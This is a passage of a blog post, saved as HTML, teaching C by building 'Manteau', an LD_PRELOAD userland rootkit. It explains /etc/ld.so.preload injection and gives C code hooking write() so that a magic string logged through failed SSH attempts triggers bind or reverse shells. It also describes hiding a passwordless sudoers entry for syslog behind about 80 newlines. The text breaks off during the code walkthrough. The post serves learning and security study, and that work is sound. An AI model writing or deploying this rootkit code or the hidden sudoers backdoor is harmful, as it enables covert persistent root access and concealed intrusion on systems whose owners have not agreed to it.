@@ -1,0 +1,1502 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Creating a Rootkit to Learn C - The Human Machine Interface</title>
+<meta name="description" content="Background InformationThis post is my solution for the last assignment in my Learning-C repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related program, namely a malicious shared library rootkit.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="The Human Machine Interface">
+<meta property="og:title" content="Creating a Rootkit to Learn C">
+<meta property="og:url" content="https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/">
+
+
+  <meta property="og:description" content="Background InformationThis post is my solution for the last assignment in my Learning-C repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related program, namely a malicious shared library rootkit.">
+
+
+
+  <meta property="og:image" content="https://h0mbre.github.io/assets/images/avatar.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-09-29T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "The Human Machine Interface",
+      "url": "https://h0mbre.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="The Human Machine Interface Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">The Human Machine Interface</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="https://mmistakes.github.io/minimal-mistakes/docs/quick-start-guide/" >Quick-Start Guide</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://h0mbre.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Creating a Rootkit to Learn C</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.jpg" alt="h0mbre" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">h0mbre</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Binary Exploitation
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">American East Coast</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="mailto:h0mbre.pwn@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://twitter.com/h0mbre_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/h0mbre" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Creating a Rootkit to Learn C">
+    <meta itemprop="description" content="Background InformationThis post is my solution for the last assignment in my Learning-C repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related program, namely a malicious shared library rootkit.">
+    <meta itemprop="datePublished" content="September 29, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Creating a Rootkit to Learn C
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  32 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <h2 id="background-information">Background Information</h2>
+<p>This post is my solution for the last assignment in my <a href="https://github.com/h0mbre/Learning-C">Learning-C</a> repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related program, namely a malicious shared library rootkit.</p>
+
+<p>I came across LD_PRELOAD rootkits while watching <a href="https://www.youtube.com/watch?v=wyRRbow4-bc&amp;feature=youtu.be">a talk by @r00tkillah</a> in 2016 about his initrd rootkit. He talks about historical approaches to Linux rootkits and the LD_PRELOAD approach gets some good coverage. Since it was described in the talk as a userland approach, I started reading about them and quickly discovered a few well-known implementations, namely the <a href="https://github.com/chokepoint/Jynx2">Jynx Rootkit</a>. Jynx has a lot of articles discussing its features and how to detect it. It was fairly robust, checking in at around 1,500 lines of code in the main file and hooking ~20 syscalls.</p>
+
+<p>My goal for this assignment since we had just learned how to hook syscalls in the previous assignment, was to create a userland rootkit which:</p>
+<ul>
+  <li>provided a backdoor/command-shell opportunity,</li>
+  <li>hid malicious network connections from <code class="language-plaintext highlighter-rouge">netstat</code> (and maybe <code class="language-plaintext highlighter-rouge">lsof</code>), and</li>
+  <li>hid malicious files.</li>
+</ul>
+
+<p><strong>To be clear:</strong> I’m fully aware this isn’t a robust, ground breaking program. These techniques have been analyzed and discussed for around 7 years now. <strong>BUT</strong> it is sort of a niche subject and something I don’t think many people have come across. I would also like to just point people towards blogs and posts that detail the technical details at play here instead of expounding on those details myself, as I am not an expert.</p>
+
+<p><strong><em>Do not use these techinques for malicious purposes. The technical explanation of the code and techniques below are simply my understanding of how they work. It is entirely possible I have completely misinterpreted how these programs behave and running them on your system could cause damage.</em></strong></p>
+
+<h2 id="shared-libraries-and-ld_preload">Shared Libraries and LD_PRELOAD</h2>
+
+<p>A lot has been written on the topic of Shared Libraries so I won’t spend much time here explaining them (we even touched on them in the last post). Shared or dynamic libraries define functions that the dynamic linker links to other programs during their run time. A common example is <a href="http://man7.org/linux/man-pages/man7/libc.7.html">libc</a>. This reduces the amount of code you need in a program executable because it shares function definitions with a library.</p>
+
+<p><code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> is a configurable environment variable that allows users to specify a shared library to be loaded into memory for programs before other shared libraries. Just a quick example, if we check the shared libraries used by <code class="language-plaintext highlighter-rouge">/bin/ls</code> on a standard x86 Kali box, we get:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/ # ldd /bin/ls                                             
+	linux-gate.so.1 (0xb7fcf000)
+	libselinux.so.1 =&gt; /lib/i386-linux-gnu/libselinux.so.1 (0xb7f57000)
+	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7d79000)
+	libpcre.so.3 =&gt; /lib/i386-linux-gnu/libpcre.so.3 (0xb7d00000)
+	libdl.so.2 =&gt; /lib/i386-linux-gnu/libdl.so.2 (0xb7cfa000)
+	/lib/ld-linux.so.2 (0xb7fd1000)
+	libpthread.so.0 =&gt; /lib/i386-linux-gnu/libpthread.so.0 (0xb7cd9000)
+</code></pre></div></div>
+
+<p>So we see a number of shared library dependencies for <code class="language-plaintext highlighter-rouge">/bin/ls</code>. If we set the environment variable for <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> to a notional shared library we can actually change what shared library dependencies that binary has. Furthermore, <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> allows us to specify that our chosen library is loaded into memory <strong>before all others</strong>. We can create a shared library called <code class="language-plaintext highlighter-rouge">example.so</code> and export it <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> as follows, and then check the library dependencies of <code class="language-plaintext highlighter-rouge">/bin/ls</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # export LD_PRELOAD=$PWD/example.so                                                                     
+tokyo:~/LearningC/ # ldd /bin/ls                                                                                            
+	linux-gate.so.1 (0xb7fc0000)
+	/root/LearningC/example.so (0xb7f8f000)
+	libselinux.so.1 =&gt; /lib/i386-linux-gnu/libselinux.so.1 (0xb7f43000)
+	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7d65000)
+	libdl.so.2 =&gt; /lib/i386-linux-gnu/libdl.so.2 (0xb7d5f000)
+	libpcre.so.3 =&gt; /lib/i386-linux-gnu/libpcre.so.3 (0xb7ce6000)
+	/lib/ld-linux.so.2 (0xb7fc2000)
+	libpthread.so.0 =&gt; /lib/i386-linux-gnu/libpthread.so.0 (0xb7cc5000)
+</code></pre></div></div>
+
+<p>As you can see, our library at <code class="language-plaintext highlighter-rouge">/root/LearningC/example.so</code> is loaded first before any other library on disk. (<a href="https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html">Awesome explanation</a> of that first library, “<code class="language-plaintext highlighter-rouge">linux-gate.so.1</code>”)</p>
+
+<p>It should be noted that by not specifying a binary after the path to our shared library, <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> will use the specified shared library for all dynamically linked programs system wide.</p>
+
+<h2 id="etcldsopreload">/etc/ld.so.preload</h2>
+<p>As a way to avoid setting environment variables, we are also allowed to create a text file called <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> and shared libraries stored in this file delimited by a white space will be <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>‘d in a sense in the order that they’re written, again, system-wide. There is no way to specify a binary this way, this will apply to all dynamically linked programs. We can see that dynamically linked programs check for this file’s existence when they are called upon by using the <code class="language-plaintext highlighter-rouge">strace</code> utility to spy on what system calls a program makes when run. Let’s again try <code class="language-plaintext highlighter-rouge">/bin/ls</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # strace /bin/ls                                                                                        
+execve("/bin/ls", ["/bin/ls"], 0xbf8d8e60 /* 47 vars */) = 0
+brk(NULL)                               = 0xbc1000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed6000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+-----snip-----
+</code></pre></div></div>
+
+<p>As you can see, <code class="language-plaintext highlighter-rouge">/bin/ls</code> calls the <code class="language-plaintext highlighter-rouge">access()</code> syscall, and checks to see if it has access to <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>; however, the return value is a <code class="language-plaintext highlighter-rouge">-1</code> indicating that the file does not exist (<code class="language-plaintext highlighter-rouge">No such file or directory</code>).</p>
+
+<p>Let’s create the file and then run this excercise again:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # echo "" &gt; /etc/ld.so.preload                                                                           
+tokyo:~/LearningC/ # strace /bin/ls                                                                                        
+execve("/bin/ls", ["/bin/ls"], 0xbfcba0a0 /* 47 vars */) = 0
+brk(NULL)                               = 0x570000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eff000
+access("/etc/ld.so.preload", R_OK)      = 0
+openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+-----snip-----
+</code></pre></div></div>
+
+<p>This time, we actually get an <code class="language-plaintext highlighter-rouge">openat()</code> syscall right after <code class="language-plaintext highlighter-rouge">access()</code> because access finishes with a return value of <code class="language-plaintext highlighter-rouge">0</code> indicating success. <code class="language-plaintext highlighter-rouge">openat()</code> returns a value of <code class="language-plaintext highlighter-rouge">3</code> as a file descriptor.</p>
+
+<p>Let’s input our malicious <code class="language-plaintext highlighter-rouge">example.so</code> library in <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> and see what <code class="language-plaintext highlighter-rouge">strace</code> has to say about it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # strace /bin/ls                                                                                        
+execve("/bin/ls", ["/bin/ls"], 0xbf956640 /* 47 vars */) = 0
+brk(NULL)                               = 0x1a8f000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
+access("/etc/ld.so.preload", R_OK)      = 0
+openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=27, ...}) = 0
+mmap2(NULL, 27, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7f92000
+close(3)                                = 0
+openat(AT_FDCWD, "/root/LearningC/example.so", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\21\0\0004\0\0\0"..., 512) = 512
+</code></pre></div></div>
+
+<p>We see that not only did it open <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code>, it read some values from the file and then opened our shared library for reading. We were able to get our shared library loaded into memory for the run time of <code class="language-plaintext highlighter-rouge">/bin/ls</code>.</p>
+
+<h2 id="hooking-syscalls-with-shared-library-injections">Hooking Syscalls with Shared Library Injections</h2>
+<p>As we have discussed in the <code class="language-plaintext highlighter-rouge">Learning C</code> progression, this preloading mechanism allows a <code class="language-plaintext highlighter-rouge">root</code> user to powerfully manipulate userland programs. We can effectively redefine common, frequently-used syscall functions and their higher-level abstraction wrapper functions to mean whatever we arbitrarily desire. If you need more information on this portion of our experiment please consult <a href="https://github.com/h0mbre/Learning-C/tree/master/Assignment-27">Assignment-27</a> of our <code class="language-plaintext highlighter-rouge">Learning C</code> repo where we go over a lot of the information discussed so far. <a href="https://github.com/h0mbre/Learning-C/tree/master/Assignment-27">In a previous example</a>, we hooked <code class="language-plaintext highlighter-rouge">puts()</code> by using an example found in <a href="https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/">this blog post</a> to check its buffer for a string and if found, print a different message to the terminal.</p>
+
+<h2 id="the-noob-rootkit-manteau">The Noob Rootkit “Manteau”</h2>
+<p>To meet my aforementioned rootkit goals I didn’t have to hook many syscalls. I ended up hooking <code class="language-plaintext highlighter-rouge">write()</code>, <code class="language-plaintext highlighter-rouge">readdir()</code>, <code class="language-plaintext highlighter-rouge">readdir64()</code>, <code class="language-plaintext highlighter-rouge">fopen()</code>, and <code class="language-plaintext highlighter-rouge">fopen64()</code>. If you discount the <code class="language-plaintext highlighter-rouge">64</code> variations for large file considerations, basically just 3 syscalls. With these 3 syscalls, we can hide from <code class="language-plaintext highlighter-rouge">netstat</code>, <code class="language-plaintext highlighter-rouge">lsof</code>, <code class="language-plaintext highlighter-rouge">ls</code>, and also spawn some plaintext connections to our attacker machine. “Manteau” means cloak in French, let’s make this as corny as possible.</p>
+
+<h2 id="hooking-write-for-a-trigger">Hooking <code class="language-plaintext highlighter-rouge">write()</code> For a Trigger!</h2>
+<p>Hooking <code class="language-plaintext highlighter-rouge">write()</code> was surprisingly simple for our purposes. I wanted to create a cool way to activate/trigger our rootkit from an external host. There have been some really cool ways to do this developed over the years but I tried to be somewhat low-tech and original. <a href="https://github.com/chokepoint/Jynx2/blob/master/jynx2.c">The Jynx rootkit</a> I have discussed previously in the repo, hooked the <code class="language-plaintext highlighter-rouge">accept()</code> syscall (which we will be using a lot in this post) to check local and source port information of the connection as a way to check if the connection came from the attacker. These values were hardcoded in their malicious library and could be set at compile time. It then would prompt for a password and spawn an encrypted back connect over <code class="language-plaintext highlighter-rouge">openssl</code>. We won’t be doing anything that badass, but we will be doing something cool.</p>
+
+<h3 id="making-syslog-evil">Making Syslog Evil</h3>
+<p>Initially, when contemplating ways to make a remote host do work after touching it in someway, I landed on the Apache <code class="language-plaintext highlighter-rouge">access.log</code>. What I thought I would do is, I would send a simple <code class="language-plaintext highlighter-rouge">GET HTTP</code> request with a magic string in the <code class="language-plaintext highlighter-rouge">User Agent:</code> field, and when the Apache process wrote that information to disk in the <code class="language-plaintext highlighter-rouge">access.log</code>, our hook would check the <code class="language-plaintext highlighter-rouge">write()</code> buffer for our magic string and if found, spawn a connection to our host.</p>
+
+<p>This actually worked, and it worked really well! However, there was a small problem. It actually required me restarting Apache after specifying our malicious library in <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> so that was aesthetically displeasing to me. I didn’t like the fact that you’d have to restart a webservice for your rootkit, not saying our shared library is super stealth, but knocking over a webserver is kind of high-visibility.</p>
+
+<p>Along those same lines, I discovered that the <code class="language-plaintext highlighter-rouge">syslog</code> user writes failed SSH attempts to <code class="language-plaintext highlighter-rouge">auth.log</code>. It logs the user’s username and IP address. Example entry: <code class="language-plaintext highlighter-rouge">Failed password for nobody from 91.205.189.15 port 38556 ssh2</code>. Awesome, we control the username field (<code class="language-plaintext highlighter-rouge">nobody</code> in the example) in a log on the system. The same problem applies, we must restart syslog after loading our shared library, but this isn’t as high visibility as say, restarting Apache. (Linux sysadmins let me know if I’m wrong about that).</p>
+
+<p>A second problem we face is that we don’t want to come back to this box as <code class="language-plaintext highlighter-rouge">syslog</code>, we want to come back as <code class="language-plaintext highlighter-rouge">root</code>. There are probably a million ways to leave yourself privesc breadcrumbs, especially given that you can hide arbitrary files, but I chose to just <code class="language-plaintext highlighter-rouge">visudo</code> the <code class="language-plaintext highlighter-rouge">sudoers</code> file and add <code class="language-plaintext highlighter-rouge">syslog</code>. I also inserted about 80 newlines after the last bit of visible text in the file before adding the <code class="language-plaintext highlighter-rouge">syslog ALL=(ALL) NOPASSWD:ALL</code> entry so that the casual <code class="language-plaintext highlighter-rouge">sudoers</code> file editor hopefully wouldn’t notice. (LOL)</p>
+
+<p>Alright, so we have a trigger idea and a built in privesc. Let’s write some C finally!</p>
+
+<h3 id="write-hook">Write Hook</h3>
+<p>The <code class="language-plaintext highlighter-rouge">write()</code> hook I created is a lot like the <code class="language-plaintext highlighter-rouge">puts()</code> hi-jack we already studied surprisingly. The first portion looks like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">new_write</span><span class="p">)(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">);</span>
+
+    <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span>
+
+    <span class="n">new_write</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"write"</span><span class="p">);</span>
+
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">bind4</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_4</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">bind6</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_6</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">rev4</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_R_4</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">rev6</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_R_6</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Let’s break this down:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">ssize_t write(int fildes, const void *buf, size_t nbytes)</code> this is the man page declaration of the <code class="language-plaintext highlighter-rouge">write()</code> function. This has to match perfectly or the calling process won’t use our shared library as a resource, it will continue to look for <code class="language-plaintext highlighter-rouge">write()</code> definition elsewhere. Now that we have the calling process’ attention;</li>
+  <li><code class="language-plaintext highlighter-rouge">ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);</code> we declare a second function with the same structure as the genuine <code class="language-plaintext highlighter-rouge">write()</code> function. This one is actually declaring a pointer but it is not yet initialized (it doesn’t yet point to anything). <code class="language-plaintext highlighter-rouge">(*new_write)</code> says “this is a pointer to a function called <code class="language-plaintext highlighter-rouge">new_write()</code>” and then the rest of the declaration provides a definition for the function that will eventually be pointed to;</li>
+  <li><code class="language-plaintext highlighter-rouge">new_write = dlsym(RTLD_NEXT, "write");</code> does something very crucial. We had already declared a pointer to <code class="language-plaintext highlighter-rouge">new_write()</code> but we hadn’t yet initialized it. <em>Now</em> we are initializing it and giving it a memory address to point to. It is now going to point to the address returned by <code class="language-plaintext highlighter-rouge">dlsym</code> [https://linux.die.net/man/3/dlsym]. <code class="language-plaintext highlighter-rouge">dlsym</code> is a way to interface with the dynamic linker and we give it two arguments. We ask it to find the next occurence (<code class="language-plaintext highlighter-rouge">RTLD_NEXT</code>) in the subsequent linked libraries of the call <code class="language-plaintext highlighter-rouge">"write"</code>. <code class="language-plaintext highlighter-rouge">dlsym</code> returns the address of next occurence found of that <code class="language-plaintext highlighter-rouge">"write"</code> symbol. What would that be? Well, it’s going to be the address of the <strong>REAL</strong> <code class="language-plaintext highlighter-rouge">write()</code> function, because it’s going to consult the legitimate libraries after ours. So now, <code class="language-plaintext highlighter-rouge">new_write</code> is essentially just a reference to the actual real <code class="language-plaintext highlighter-rouge">write()</code> syscall as intended;</li>
+  <li><code class="language-plaintext highlighter-rouge">ssize_t result;</code> we declare a variable of type <code class="language-plaintext highlighter-rouge">ssize_t</code> the data type returned by our <code class="language-plaintext highlighter-rouge">write()</code> function and call it <code class="language-plaintext highlighter-rouge">result</code>.</li>
+  <li>The last four lines are very similar, <code class="language-plaintext highlighter-rouge">char *bind4 = strstr(buf, KEY_4);</code> delcares and initializes a new pointer variable of the <code class="language-plaintext highlighter-rouge">char</code> type that is equal to the result of the <code class="language-plaintext highlighter-rouge">strstr()</code> function after comparing the buffer being written (a reference to the <code class="language-plaintext highlighter-rouge">const void *buf</code> argument in our <code class="language-plaintext highlighter-rouge">write()</code> syscall) to a harcoded defined variable <code class="language-plaintext highlighter-rouge">KEY_4</code>. You can set <code class="language-plaintext highlighter-rouge">KEY_4</code> to whatever you like, I set it to <code class="language-plaintext highlighter-rouge">#define KEY_4 "notavaliduser4"</code>. <code class="language-plaintext highlighter-rouge">strstr()</code> is very interesting. If it finds the second argument within the first argument, it will return a pointer to the first occurence of the second argument. So if it returns a <code class="language-plaintext highlighter-rouge">NULL</code> we know that it didn’t find a match.</li>
+</ul>
+
+<p>Let’s look at the next block of code:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span><span class="n">bind4</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv4_bind</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">bind6</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv6_bind</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">rev4</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv4_rev</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">rev6</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fildes</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/null"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_APPEND</span><span class="p">);</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">new_write</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+        <span class="n">ipv6_rev</span><span class="p">();</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+<p>Although long, there’s not a lot to get through here. We’ve basically used <code class="language-plaintext highlighter-rouge">if/else if</code> to check the buffer being written for mulitple sub-strings that we’re using as our trigger. Let’s break it down:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">if (bind4 != NULL)</code> we check to see if the variable <code class="language-plaintext highlighter-rouge">bind4</code> is <code class="language-plaintext highlighter-rouge">NULL</code> and if it’s not, we jump to our logic;</li>
